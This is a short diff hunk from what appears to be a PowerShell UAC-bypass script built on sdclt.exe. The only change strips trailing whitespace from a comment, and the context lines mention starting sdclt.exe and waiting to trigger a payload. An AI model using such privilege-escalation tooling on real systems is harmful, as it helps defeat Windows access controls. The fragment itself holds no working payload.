@@ -83,7 +83,7 @@ This will write out "Is Elevated: True" to C:\UACBypassTest.
             Write-Verbose "Started sdclt.exe"
         }
 
-        #Sleep 5 seconds 
+        #Sleep 5 seconds
         Write-Verbose "Sleeping 5 seconds to trigger payload"
         if (-not $PSBoundParameters['WhatIf']) {
             Start-Sleep -Seconds 5
